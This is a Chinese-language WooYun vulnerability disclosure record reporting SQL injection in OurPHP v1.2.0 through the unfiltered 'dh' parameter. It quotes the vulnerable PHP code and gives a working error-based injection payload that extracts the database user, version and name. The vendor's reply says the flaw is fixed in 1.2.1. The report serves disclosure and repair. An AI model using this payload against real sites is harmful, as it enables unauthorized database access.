{"id": 33409, "wybug_id": "wooyun-2015-0108886", "wybug_title": "ourphp最新版注入漏洞又1枚（可出任意数据）", "wybug_corp": "ourphp.net", "wybug_author": "路人甲", "wybug_date": "2015-04-22 12:30", "wybug_open_date": "2015-07-21 12:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-21：\t细节向公众公开  简要描述： ourphp最新版注入漏洞又1枚 详细说明：  看到wooyun上ourphp这个厂商又出新的版本了，说修改了wooyun上现有的漏洞，我也来凑凑热闹吧。下载最新版本（ourphp_v1.2.0.20150414），2015-04-14更新的，研究学习一下。注入一枚（这个地方前面提了下个漏洞了，当时没有注意到竟然还有个参数存在注入，无心刷洞）： GET /client/user/?cn-usershopping.html-&ourphp_cms=del&id=1&dh=1 其中dh未过滤，存在注入，看代码\n无关代码elseif ($_GET[\"ourphp_cms\"] == \"del\"){\t$query = $db-> sqllist(\"select `id`,`OP_Orderspay`,`OP_Orderssend` from `ourphp_orders` where `id` = \".$_GET['id'].\" && `OP_Ordersnumber` = '\".$_GET['dh'].\"'\");\t$ourphp_rs = mysql_fetch_array($query);\tif(!mysql_num_rows($query)){\t\texit(\"no!\");\t}\tif($ourphp_rs[1] == 2){\t\texit(\"no!\");\t}\tif($ourphp_rs[2] == 2){\t\texit(\"no!\");\t}\t\t$query = $db-> sqllist(\"delete from `ourphp_orders` where `id` = '\".$_GET['id'].\"'\"); \texit(\"<script language=javascript>location.replace('\".$ourphp_webpath.\"client/user/?\".$ourphp_Language.\"-usershopping.html');</script>\");}\n直接把通过GET获得dh带入了sql语句执行，可注入出任意数据Payload:GET提交\n/client/user/?cn-usershopping.html-&ourphp_cms=del&id=1&dh=1'/**/UNION/**/SELECT/**/1/**/FROM(SELECT/**/COUNT(*),CONCAT(0x23,(SELECT/**/concat(user(),0x23,version(),0x23,database())/**/FROM/**/ourphp_admin/**/LIMIT/**/0,1),0x23,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.tables/**/GROUP/**/BY/**/x)a%23\n测试如下图\n\n   漏洞证明：  见 详细说明   修复方案：  dowith_sql   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-04-22 12:32 厂商回复： 这个以经在1.2.1中修复了 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}